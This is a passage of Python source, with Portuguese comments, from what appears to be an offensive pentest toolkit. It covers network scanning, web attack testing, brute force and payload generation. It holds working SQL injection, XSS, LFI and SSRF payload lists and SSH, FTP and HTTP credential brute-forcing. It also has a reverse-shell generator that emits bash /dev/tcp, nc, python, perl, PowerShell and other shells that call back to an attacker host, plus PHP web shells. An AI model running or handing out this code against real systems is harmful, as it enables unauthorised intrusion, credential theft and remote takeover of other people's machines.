            (5900,): "VNC exposto — verificar autenticação nula",
            (6379,): "Redis exposto — verificar acesso sem autenticação",
            (9200,): "Elasticsearch exposto — verificar acesso sem autenticação",
            (27017,): "MongoDB exposto — verificar acesso sem autenticação",
            (2375,): "Docker API exposto — container escape possível",
            (4444,): "Porta Metasploit detectada — sistema pode estar comprometido",
        }
        
        open_set = set(ports.keys())
        for combo, msg in risky_combos.items():
            if any(p in open_set for p in combo):
                severity = "HIGH" if any(p in [3389, 445, 2375, 6379, 9200, 27017] for p in combo) else "MEDIUM"
                log.finding(severity, f"Serviço de risco: porta(s) {combo}", msg, target)

    def service_version(self, target: str, port: int) -> str:
        """Tentativa de identificar versão do serviço"""
        probes = {
            22:  b"SSH-2.0-PROBE\r\n",
            25:  b"EHLO jarvis\r\n",
            80:  b"HEAD / HTTP/1.1\r\nHost: target\r\n\r\n",
            110: b"QUIT\r\n",
            143: b"A001 CAPABILITY\r\n",
            443: None,  # SSL handshake
            3306: None, # MySQL greeting
            5432: None, # PostgreSQL
        }
        
        banner = ""
        try:
            sock = socket.socket()
            sock.settimeout(5)
            sock.connect((target, port))
            
            if port in probes and probes[port]:
                sock.send(probes[port])
            
            banner = sock.recv(1024).decode("utf-8", errors="replace").strip()
            sock.close()
        except Exception:
            pass
        
        return banner

    def udp_scan(self, target: str) -> List[int]:
        """UDP scan básico nos serviços mais comuns"""
        udp_ports = {
            53: "DNS", 67: "DHCP", 68: "DHCP", 69: "TFTP",
            123: "NTP", 137: "NetBIOS-NS", 138: "NetBIOS-DGM",
            161: "SNMP", 162: "SNMP-Trap", 389: "LDAP",
            500: "IKE", 514: "Syslog", 520: "RIP",
            1900: "SSDP", 5353: "mDNS", 11211: "Memcached"
        }
        open_udp = []
        log.info(f"UDP scan básico em {target}...")
        
        for port, service in udp_ports.items():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(2)
                sock.sendto(b"\x00" * 8, (target, port))
                data, _ = sock.recvfrom(1024)
                if data:
                    open_udp.append(port)
                    log.success(f"UDP OPEN {port:5d} {service}")
                sock.close()
            except socket.timeout:
                pass  # Timeout pode significar filtrado ou aberto
            except Exception:
                pass
        
        return open_udp

    def os_fingerprint(self, target: str) -> str:
        """Fingerprinting básico de OS via TTL e outros indicadores"""
        ttl_map = {
            64: "Linux/Unix/MacOS",
            128: "Windows",
            255: "Cisco IOS/Network Device",
            254: "Solaris/AIX"
        }
        
        try:
            out = subprocess.run(
                ["ping", "-c", "1", "-W", "2", target],
                capture_output=True, text=True, timeout=5
            )
            for line in out.stdout.split("\n"):
                if "ttl=" in line.lower():
                    ttl = int(re.search(r"ttl=(\d+)", line.lower()).group(1))
                    for base_ttl, os_name in ttl_map.items():
                        if ttl <= base_ttl:
                            log.info(f"OS fingerprint (TTL={ttl}): provável {os_name}")
                            return os_name
        except Exception:
            pass
        return "Desconhecido"

    def nmap_wrapper(self, target: str, args: str = "-sV -sC") -> str:
        """Wrapper para nmap se disponível"""
        if not shutil.which("nmap"):
            log.warn("nmap não encontrado. Instale: sudo apt install nmap")
            return ""
        
        cmd = ["nmap"] + args.split() + [target]
        log.info(f"Executando: {' '.join(cmd)}")
        
        try:
            out = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            output = out.stdout
            
            # Salvar output
            fname = os.path.join(WORKSPACE_DIR, f"nmap_{target.replace('/', '_')}_{int(time.time())}.txt")
            with open(fname, "w") as f:
                f.write(output)
            log.success(f"Resultado nmap salvo: {fname}")
            return output
        except subprocess.TimeoutExpired:
            log.error("nmap timeout")
            return ""
        except Exception as e:
            log.error(f"nmap falhou: {e}")
            return ""

scanner = NetworkScanner()

# ─────────────────────────────────────────────
#  MÓDULO: WEB SECURITY
# ─────────────────────────────────────────────
class WebModule:
    def __init__(self):
        self.name = "Web Application Security"
        self.ua = config.get("STEALTH", "user_agent")

    def _request(self, url: str, method: str = "GET", data: Optional[str] = None,
                  headers: Optional[Dict] = None, follow: bool = True) -> Tuple[int, Dict, str]:
        try:
            parsed = urllib.parse.urlparse(url)
            is_ssl = parsed.scheme == "https"
            conn_class = http.client.HTTPSConnection if is_ssl else http.client.HTTPConnection
            
            ctx = ssl.create_default_context() if is_ssl else None
            if ctx:
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
            
            conn = conn_class(parsed.netloc, timeout=10, context=ctx) if is_ssl else conn_class(parsed.netloc, timeout=10)
            
            h = {"User-Agent": self.ua, "Connection": "close"}
            if headers:
                h.update(headers)
            if data:
                h["Content-Type"] = "application/x-www-form-urlencoded"
                h["Content-Length"] = str(len(data))
            
            path = parsed.path or "/"
            if parsed.query:
                path += "?" + parsed.query
            
            conn.request(method, path, body=data, headers=h)
            resp = conn.getresponse()
            body = resp.read(50000).decode("utf-8", errors="replace")
            resp_headers = dict(resp.getheaders())
            status = resp.status
            conn.close()
            return status, resp_headers, body
        except Exception as e:
            return 0, {}, str(e)

    def dir_bruteforce(self, url: str, wordlist: Optional[str] = None,
                       extensions: str = "php,html,txt,bak,old,js,json,xml") -> List[Dict]:
        """Directory/file bruteforce"""
        if not url.endswith("/"):
            url += "/"
        
        found = []
        ext_list = [""] + ["." + e for e in extensions.split(",")]
        
        # Wordlist embutida
        builtin_words = [
            "admin", "administrator", "login", "panel", "dashboard", "cpanel",
            "phpmyadmin", "pma", "wp-admin", "wp-login", "wp-config",
            "config", "configuration", "conf", "settings", "setup",
            "install", "installer", "backup", "backups", "old", "new",
            "test", "testing", "debug", "dev", "development", "staging",
            "api", "v1", "v2", "v3", "rest", "graphql", "swagger",
            "docs", "documentation", "help", "faq", "support",
            "upload", "uploads", "files", "file", "media", "images", "img",
            "static", "assets", "css", "js", "scripts", "includes",
            "lib", "libs", "library", "vendor", "node_modules",
            "database", "db", "sql", "dump", "export",
            "log", "logs", "error", "errors", "access",
            "cgi-bin", "cgi", "scripts", "bin",
            "robots", "sitemap", "crossdomain", "clientaccesspolicy",
            ".git", ".svn", ".hg", ".env", ".htaccess", ".htpasswd",
            "xmlrpc", "feed", "atom", "rss",
            "user", "users", "account", "accounts", "profile",
            "register", "signup", "forgot", "reset", "password",
            "shell", "cmd", "command", "exec", "run",
            "manager", "management", "console", "terminal",
            "phpinfo", "info", "server-status", "server-info",
            ".DS_Store", "thumbs.db", "desktop.ini",
            "readme", "changelog", "license", "version",
            "health", "healthcheck", "status", "ping", "metrics",
            "actuator", "actuator/health", "actuator/env", "actuator/mappings",
        ]
        
        words = builtin_words[:]
        if wordlist and os.path.exists(wordlist):
            with open(wordlist) as f:
                words += [l.strip() for l in f if l.strip()]
        
        paths = []
        for w in set(words):
            for ext in ext_list:
                paths.append(w + ext)
        
        log.info(f"Dir bruteforce em {url} — {len(paths)} paths...")
        
        def check_path(path):
            target_url = url + path
            status, headers, body = self._request(target_url)
            if status not in [0, 404, 400]:
                return {"url": target_url, "status": status, "size": len(body)}
            return None
        
        with ThreadPoolExecutor(max_workers=30) as ex:
            futures = {ex.submit(check_path, p): p for p in paths}
            for fut in as_completed(futures):
                r = fut.result()
                if r:
                    found.append(r)
                    status_color = C.SUCCESS if r["status"] == 200 else C.WARN
                    print(f"  {status_color}[{r['status']}]{C.RESET} {r['url']} ({r['size']} bytes)")
                    
                    # Alertas especiais
                    if any(x in r["url"] for x in [".git", ".env", "backup", "config", "phpinfo"]):
                        log.finding("HIGH", f"Arquivo sensível exposto", f"Acessível: {r['url']}", url)
        
        log.info(f"Dir bruteforce: {len(found)} paths encontrados")
        return found

    def sql_injection_test(self, url: str, params: Optional[Dict] = None) -> List[Dict]:
        """Teste básico de SQL Injection"""
        findings = []
        
        payloads = [
            # Error-based
            "'", "''", "\"", "`",
            "' OR '1'='1", "' OR '1'='1'--", "' OR 1=1--",
            "1' ORDER BY 1--", "1' ORDER BY 100--",
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "1 AND 1=1", "1 AND 1=2",
            # Time-based (MySQL)
            "' AND SLEEP(3)--", "1; WAITFOR DELAY '0:0:3'--",
            "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
            # Stacked
            "'; DROP TABLE users--",
            # Boolean
            "' AND 1=1--", "' AND 1=2--",
            # XML/NoSQL
            "' || '1'='1", "{$gt: ''}",
        ]
        
        error_patterns = [
            r"sql syntax", r"mysql_fetch", r"ora-\d+", r"microsoft sql",
            r"unclosed quotation", r"you have an error in your sql",
            r"sqlite_error", r"pg_query", r"psql:", r"syntax error.*sql",
            r"warning.*mysql", r"fatal.*mysql"
        ]
        
        log.info(f"SQL Injection test em {url}...")
        
        # Pegar parâmetros da URL se não fornecidos
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query)
        
        if not params and not qs:
            log.warn("Nenhum parâmetro encontrado. Adicione ?param=value na URL")
            return []
        
        test_params = params or {k: v[0] for k, v in qs.items()}
        base_url = url.split("?")[0]
        
        for param, value in test_params.items():
            for payload in payloads:
                test_p = dict(test_params)
                test_p[param] = payload
                test_url = base_url + "?" + urllib.parse.urlencode(test_p)
                
                status, headers, body = self._request(test_url)
                
                # Verificar erros SQL
                for pattern in error_patterns:
                    if re.search(pattern, body, re.IGNORECASE):
                        f = {
                            "type": "SQL Injection (Error-based)",
                            "param": param,
                            "payload": payload,
                            "url": test_url,
                            "evidence": re.search(pattern, body, re.IGNORECASE).group(0)
                        }
                        findings.append(f)
                        log.finding("CRITICAL", "SQL Injection Encontrado",
                                   f"Parâmetro: {param} | Payload: {payload}",
                                   test_url)
                        break
        
        if not findings:
            log.info("SQL Injection: nenhuma evidência encontrada nos testes básicos")
        return findings

    def xss_test(self, url: str) -> List[Dict]:
        """Teste básico de XSS"""
        findings = []
        
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "\"><script>alert(1)</script>",
            "';alert(1)//",
            "<body onload=alert(1)>",
            "<<script>alert(1)</script>",
            "<scr<script>ipt>alert(1)</script>",
            "<IMG SRC=javascript:alert(1)>",
            "<SCRIPT>alert(1)</SCRIPT>",
            "<iframe src=javascript:alert(1)>",
            "'+alert(1)+'",
            "<details open ontoggle=alert(1)>",
        ]
        
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query)
        
        if not qs:
            log.warn("Nenhum parâmetro na URL para testar XSS")
            return []
        
        base_url = url.split("?")[0]
        params = {k: v[0] for k, v in qs.items()}
        
        log.info(f"XSS test em {url}...")
        
        for param in params:
            for payload in payloads:
                test_p = dict(params)
                test_p[param] = payload
                test_url = base_url + "?" + urllib.parse.urlencode(test_p)
                
                status, headers, body = self._request(test_url)
                
                if payload.lower() in body.lower():
                    f = {
                        "type": "XSS Reflected",
                        "param": param,
                        "payload": payload,
                        "url": test_url
                    }
                    findings.append(f)
                    log.finding("HIGH", "XSS Reflected Encontrado",
                               f"Param: {param} | Payload: {payload}", test_url)
                    break
        
        return findings

    def lfi_test(self, url: str) -> List[Dict]:
        """Teste de Local File Inclusion"""
        findings = []
        
        payloads = [
            "../../../../etc/passwd",
            "../../../../etc/shadow",
            "../../../../windows/system32/drivers/etc/hosts",
            "../../../../windows/win.ini",
            "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
            "....//....//....//....//etc/passwd",
            "/etc/passwd",
            "/etc/hosts",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/read=string.rot13/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            "expect://id",
            "file:///etc/passwd",
            "\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini",
        ]
        
        lfi_signatures = ["root:x:", "root:0:0", "bin:x:", "[extensions]", "[boot loader]", "daemon:"]
        
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query)
        
        if not qs:
            log.warn("Nenhum parâmetro para testar LFI")
            return []
        
        base_url = url.split("?")[0]
        params = {k: v[0] for k, v in qs.items()}
        log.info(f"LFI test em {url}...")
        
        for param in params:
            for payload in payloads:
                test_p = dict(params)
                test_p[param] = payload
                test_url = base_url + "?" + urllib.parse.urlencode(test_p)
                
                status, headers, body = self._request(test_url)
                
                for sig in lfi_signatures:
                    if sig in body:
                        f = {"type": "LFI", "param": param, "payload": payload, "url": test_url}
                        findings.append(f)
                        log.finding("CRITICAL", "LFI Encontrado",
                                   f"Param: {param} | Payload: {payload} | Sig: {sig}", test_url)
                        break
        
        return findings

    def ssrf_test(self, url: str) -> List[Dict]:
        """Teste básico de SSRF"""
        findings = []
        payloads = [
            "http://169.254.169.254/latest/meta-data/",         # AWS IMDSv1
            "http://169.254.169.254/latest/meta-data/iam/",
            "http://169.254.170.2/v2/credentials/",             # AWS ECS
            "http://metadata.google.internal/computeMetadata/v1/",  # GCP
            "http://100.100.100.200/latest/meta-data/",          # Alibaba
            "http://localhost/",
            "http://127.0.0.1/",
            "http://127.0.0.1:22/",
            "http://127.0.0.1:3306/",
            "http://127.0.0.1:6379/",
            "dict://127.0.0.1:6379/info",
            "gopher://127.0.0.1:6379/_INFO",
            "file:///etc/passwd",
            "http://[::1]/",
            "http://0x7f000001/",    # 127.0.0.1 em hex
        ]
        
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query)
        params = {k: v[0] for k, v in qs.items()}
        
        log.info(f"SSRF test em {url}...")
        
        for param in params:
            for payload in payloads:
                test_p = dict(params)
                test_p[param] = payload
                test_url = url.split("?")[0] + "?" + urllib.parse.urlencode(test_p)
                
                status, headers, body = self._request(test_url)
                
                # Indicadores de SSRF
                if status == 200 and any(s in body for s in ["ami-id", "computeMetadata", "instance-id", "security-credentials"]):
                    log.finding("CRITICAL", "SSRF Confirmado — Metadata de Cloud",
                               f"Payload: {payload}", test_url)
                    findings.append({"type": "SSRF", "payload": payload, "url": test_url})
                elif status != 0 and "169.254" in payload and status not in [404, 400]:
                    log.finding("HIGH", "Possível SSRF",
                               f"Resposta não-erro para metadata URL. Status: {status}", test_url)
        
        return findings

    def cors_check(self, url: str) -> Dict:
        """Verificar configuração CORS"""
        result = {"misconfigured": False, "details": []}
        
        origins_to_test = [
            "https://evil.com",
            "https://attacker.com",
            "null",
            f"https://evil.{url.split('/')[2]}",  # prefix bypass
            f"https://{url.split('/')[2]}.evil.com",  # suffix bypass
        ]
        
        log.info(f"CORS check em {url}...")
        
        for origin in origins_to_test:
            status, headers, body = self._request(url, headers={"Origin": origin})
            acao = headers.get("access-control-allow-origin") or headers.get("Access-Control-Allow-Origin", "")
            acac = headers.get("access-control-allow-credentials") or headers.get("Access-Control-Allow-Credentials", "")
            
            if acao == origin or acao == "*":
                detail = f"Origin '{origin}' refletido: ACAO={acao}, ACAC={acac}"
                result["details"].append(detail)
                result["misconfigured"] = True
                
                if acao == origin and acac.lower() == "true":
                    log.finding("CRITICAL", "CORS Misconfiguration Critical",
                               f"Origin arbitrário aceito com credentials=true | {detail}", url)
                elif acao == "*":
                    log.finding("MEDIUM", "CORS Wildcard",
                               "Access-Control-Allow-Origin: * permite qualquer origem", url)
                else:
                    log.finding("HIGH", "CORS Misconfiguration",
                               detail, url)
        
        return result

    def open_redirect_test(self, url: str) -> List[str]:
        """Teste de Open Redirect"""
        payloads = [
            "https://evil.com", "//evil.com", "///evil.com",
            "\\\\evil.com", "/\\evil.com", "//evil%E3%80%82com",
            "https:evil.com", "javascript:alert(1)",
            "%2F%2Fevil.com", "/%09/evil.com",
        ]
        
        redirect_params = ["redirect", "url", "next", "return", "goto",
                          "destination", "dest", "redirect_uri", "redirect_url",
                          "returnUrl", "returnTo", "back", "forward", "continue",
                          "target", "redir", "location", "ref", "referer"]
        
        found = []
        parsed = urllib.parse.urlparse(url)
        base = url.split("?")[0]
        
        log.info(f"Open Redirect test em {url}...")
        
        for param in redirect_params:
            for payload in payloads:
                test_url = base + f"?{param}={urllib.parse.quote(payload)}"
                status, headers, body = self._request(test_url, follow=False)
                
                location = headers.get("location") or headers.get("Location", "")
                if location and ("evil.com" in location or "javascript:" in location):
                    found.append(test_url)
                    log.finding("MEDIUM", "Open Redirect",
                               f"Param: {param} | Redirect para: {location}", test_url)
        
        return found

    def cms_detect(self, url: str) -> Dict:
        """Detectar e auditar CMS comum"""
        cms_info = {}
        
        # WordPress
        wp_paths = ["/wp-login.php", "/wp-admin/", "/wp-json/wp/v2/users",
                   "/wp-content/", "/?author=1"]
        for path in wp_paths:
            status, _, body = self._request(url.rstrip("/") + path)
            if status in [200, 301, 302]:
                cms_info["cms"] = "WordPress"
                if "wp/v2/users" in path and status == 200:
                    log.finding("MEDIUM", "WordPress User Enumeration via REST API",
                               "Endpoint /wp-json/wp/v2/users expõe lista de usuários", url)
                break
        
        # Joomla
        if "/administrator/" in url or self._request(url.rstrip("/") + "/administrator/")[0] == 200:
            cms_info["cms"] = "Joomla"
            log.finding("INFO", "Joomla Administrator Exposto", "Painel admin acessível", url)
        
        # Drupal
        _, _, drupal_body = self._request(url.rstrip("/") + "/CHANGELOG.txt")
        if "Drupal" in drupal_body:
            cms_info["cms"] = "Drupal"
            log.finding("MEDIUM", "Drupal CHANGELOG exposto", "Versão pode ser identificada", url)
        
        return cms_info

web = WebModule()

# ─────────────────────────────────────────────
#  MÓDULO: BRUTE FORCE / CREDENTIAL ATTACKS
# ─────────────────────────────────────────────
class BruteForceModule:
    def __init__(self):
        self.name = "Brute Force & Credential Attacks"
        self.wordlists = {
            "users": ["admin", "administrator", "root", "user", "test", "guest",
                     "info", "adm", "mysql", "tomcat", "service", "oracle"],
            "passwords": [
                "password", "123456", "admin", "root", "toor", "test",
                "password123", "admin123", "1234567890", "qwerty",
                "abc123", "letmein", "welcome", "monkey", "dragon",
                "master", "shadow", "sunshine", "princess", "password1",
                "123123", "12345678", "pass", "1234", "admin@123",
                "P@ssw0rd", "P@$$w0rd", "Passw0rd", "changeme",
                "default", "blank", ""
            ]
        }

    def ssh_brute(self, host: str, port: int = 22,
                  users: Optional[List[str]] = None,
                  passwords: Optional[List[str]] = None) -> List[Dict]:
        """SSH brute force"""
        if not shutil.which("hydra") and not shutil.which("medusa"):
            log.warn("Hydra/Medusa não encontrados. Tentando com paramiko...")
            return self._ssh_paramiko(host, port, users, passwords)
        
        found = []
        u_list = users or self.wordlists["users"]
        p_list = passwords or self.wordlists["passwords"]
        
        tmp_users = tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False)
        tmp_pass  = tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False)
        tmp_users.write("\n".join(u_list))
        tmp_pass.write("\n".join(p_list))
        tmp_users.close()
        tmp_pass.close()
        
        log.info(f"SSH brute {host}:{port} — {len(u_list)} users × {len(p_list)} passwords")
        
        if shutil.which("hydra"):
            cmd = ["hydra", "-L", tmp_users.name, "-P", tmp_pass.name,
                   f"ssh://{host}:{port}", "-t", "4", "-V"]
            try:
                out = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
                for line in out.stdout.split("\n"):
                    if "[ssh]" in line and "login:" in line:
                        m = re.search(r"login:\s*(\S+)\s+password:\s*(\S+)", line)
                        if m:
                            u, p = m.group(1), m.group(2)
                            found.append({"user": u, "password": p})
                            session.add_cred("ssh", u, p, f"{host}:{port}")
            except Exception as e:
                log.error(f"Hydra SSH falhou: {e}")
        
        os.unlink(tmp_users.name)
        os.unlink(tmp_pass.name)
        return found

    def _ssh_paramiko(self, host: str, port: int,
                      users: Optional[List[str]], passwords: Optional[List[str]]) -> List[Dict]:
        try:
            import paramiko
        except ImportError:
            log.error("paramiko não instalado. Execute: pip install paramiko")
            return []
        
        found = []
        u_list = users or self.wordlists["users"]
        p_list = passwords or self.wordlists["passwords"]
        
        for user in u_list:
            for pwd in p_list:
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(host, port=port, username=user, password=pwd, timeout=5, allow_agent=False)
                    log.hack(f"SSH VÁLIDO: {user}:{pwd}@{host}:{port}")
                    found.append({"user": user, "password": pwd})
                    session.add_cred("ssh", user, pwd, f"{host}:{port}")
                    ssh.close()
                except paramiko.AuthenticationException:
                    pass
                except Exception:
                    break
        return found

    def http_brute(self, url: str, user_field: str, pass_field: str,
                   error_string: str,
                   users: Optional[List[str]] = None,
                   passwords: Optional[List[str]] = None) -> List[Dict]:
        """HTTP form brute force"""
        found = []
        u_list = users or self.wordlists["users"]
        p_list = passwords or self.wordlists["passwords"]
        total = len(u_list) * len(p_list)
        
        log.info(f"HTTP brute {url} — {total} tentativas")
        count = 0
        
        for user in u_list:
            for pwd in p_list:
                count += 1
                data = urllib.parse.urlencode({user_field: user, pass_field: pwd})
                status, headers, body = web._request(url, "POST", data)
                
                if error_string not in body:
                    log.hack(f"HTTP AUTH VÁLIDO: {user}:{pwd}")
                    found.append({"user": user, "password": pwd})
                    session.add_cred("http", user, pwd, url)
                
                if count % 50 == 0:
                    sys.stdout.write(f"\r  Progresso: {count}/{total}    ")
                    sys.stdout.flush()
        
        print()
        return found

    def ftp_brute(self, host: str, port: int = 21,
                  users: Optional[List[str]] = None,
                  passwords: Optional[List[str]] = None) -> List[Dict]:
        """FTP brute force"""
        import ftplib
        found = []
        u_list = users or self.wordlists["users"]
        p_list = passwords or self.wordlists["passwords"]
        
        # Verificar anon primeiro
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=5)
            ftp.login("anonymous", "anonymous@")
            log.hack(f"FTP ANON LOGIN em {host}:{port}")
            session.add_cred("ftp", "anonymous", "anonymous@", f"{host}:{port}")
            found.append({"user": "anonymous", "password": "anonymous@"})
            files = ftp.nlst()
            log.info(f"FTP files: {files[:10]}")
            ftp.quit()
        except Exception:
            pass
        
        log.info(f"FTP brute {host}:{port}...")
        for user in u_list:
            for pwd in p_list:
                try:
                    ftp = ftplib.FTP()
                    ftp.connect(host, port, timeout=5)
                    ftp.login(user, pwd)
                    log.hack(f"FTP VÁLIDO: {user}:{pwd}@{host}:{port}")
                    found.append({"user": user, "password": pwd})
                    session.add_cred("ftp", user, pwd, f"{host}:{port}")
                    ftp.quit()
                except ftplib.error_perm:
                    pass
                except Exception:
                    break
        
        return found

    def hash_crack(self, hash_value: str, wordlist: Optional[str] = None) -> Optional[str]:
        """Crack de hash com wordlist"""
        hash_len = len(hash_value)
        hash_type = {32: "MD5", 40: "SHA1", 56: "SHA224", 64: "SHA256",
                    96: "SHA384", 128: "SHA512"}.get(hash_len, "Unknown")
        
        log.info(f"Tentando quebrar hash {hash_type}: {hash_value}")
        
        # Wordlist embutida para teste rápido
        test_words = self.wordlists["passwords"] + ["admin", "password", "test", "user", "root", "hello"]
        
        if wordlist and os.path.exists(wordlist):
            with open(wordlist) as f:
                all_words = [l.strip() for l in f] + test_words
        else:
            all_words = test_words
        
        hash_fns = {
            "MD5": hashlib.md5,
            "SHA1": hashlib.sha1,
            "SHA256": hashlib.sha256,
            "SHA512": hashlib.sha512,
        }
        
        fn = hash_fns.get(hash_type)
        if not fn:
            log.error(f"Tipo de hash não suportado localmente: {hash_type}")
            return None
        
        count = 0
        for word in all_words:
            h = fn(word.encode()).hexdigest()
            if h == hash_value:
                log.hack(f"HASH QUEBRADO: {hash_value} = '{word}'")
                return word
            count += 1
            if count % 1000 == 0:
                sys.stdout.write(f"\r  Tentativas: {count}/{len(all_words)}")
                sys.stdout.flush()
        
        print()
        log.warn(f"Hash não quebrado em {len(all_words)} tentativas")
        return None

    def spray_attack(self, targets: List[str], service: str,
                     password: str, users: Optional[List[str]] = None) -> List[Dict]:
        """Password spray — uma senha para muitos usuários"""
        found = []
        u_list = users or self.wordlists["users"]
        
        log.info(f"Password spray: '{password}' em {len(targets)} targets × {len(u_list)} usuários")
        log.warn("OPSEC: Password spray pode causar lockout! Prosseguir? (y/n)")
        confirm = input("  > ").strip().lower()
        if confirm != "y":
            log.info("Cancelado pelo usuário")
            return []
        
        for target in targets:
            for user in u_list:
                if service == "ssh":
                    result = self._ssh_paramiko(target, 22, [user], [password])
                    found.extend(result)
                # Adicionar outros serviços conforme necessário
                time.sleep(random.uniform(0.5, 2.0))  # Delay anti-lockout
        
        return found

brute = BruteForceModule()

# ─────────────────────────────────────────────
#  MÓDULO: PAYLOAD GENERATOR
# ─────────────────────────────────────────────
class PayloadGenerator:
    def __init__(self):
        self.name = "Payload Generator"

    def reverse_shell(self, lhost: str, lport: str, shell_type: str = "bash") -> str:
        """Gera payloads de reverse shell"""
        payloads = {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "bash_encoded": f"echo {base64.b64encode(f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'.encode()).decode()} | base64 -d | bash",
            "python2": f"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "php_system": f"<?php system($_GET['cmd']); ?>",
            "php_exec": f"<?php echo shell_exec($_REQUEST['cmd']); ?>",
            "php_passthru": f"<?php passthru($_GET['cmd']); ?>",
            "nc": f"nc -e /bin/sh {lhost} {lport}",
            "nc_no_e": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
            "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            "powershell": f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
            "powershell_encoded": "",  # será gerado abaixo
            "java": f"r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[])\np.waitFor()",
            "golang": f"""package main
import (
    "net"
    "os/exec"
    "time"
)
func main() {{
    c, _ := net.Dial("tcp", "{lhost}:{lport}")
    for {{
        cmd := exec.Command("/bin/sh")
        cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
        cmd.Run()
        time.Sleep(5)
    }}
}}""",
            "socat": f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}",
            "awk": f"awk 'BEGIN {{s = \"/inet/tcp/0/{lhost}/{lport}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c)}} }} while(c != \"exit\") }}}}'",
        }
        
        # Gerar PS encoded
        ps_cmd = f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        ps_bytes = ps_cmd.encode("utf-16-le")
        ps_encoded = base64.b64encode(ps_bytes).decode()
        payloads["powershell_encoded"] = f"powershell -enc {ps_encoded}"
        
        if shell_type == "all":
            print(f"\n{C.CYAN}{'═'*60}{C.RESET}")
            print(f"  {C.BOLD}Reverse Shells — LHOST: {lhost} LPORT: {lport}{C.RESET}")
            print(f"{C.CYAN}{'═'*60}{C.RESET}")
            for k, v in payloads.items():
                if v:
                    print(f"\n  {C.YELLOW}[{k.upper()}]{C.RESET}")
                    print(f"  {C.DIM}{v[:200]}{'...' if len(v) > 200 else ''}{C.RESET}")
            print(f"\n  {C.CYAN}Listener:{C.RESET} nc -lvnp {lport}")
            print(f"  {C.CYAN}Listener (rlwrap):{C.RESET} rlwrap nc -lvnp {lport}\n")
            return str(payloads)
        
        result = payloads.get(shell_type, "")
        if not result:
            log.error(f"Tipo '{shell_type}' não encontrado. Tipos: {', '.join(payloads.keys())}")
            return ""
        
        print(f"\n  {C.YELLOW}[{shell_type.upper()} Reverse Shell]{C.RESET}")
        print(f"  {C.BOLD}{result}{C.RESET}")
        print(f"\n  {C.CYAN}Listener:{C.RESET} nc -lvnp {lport}\n")
        return result

    def web_shells(self) -> Dict[str, str]:
        """Coleção de web shells"""
        shells = {
            "php_minimal": "<?php system($_GET['cmd']); ?>",
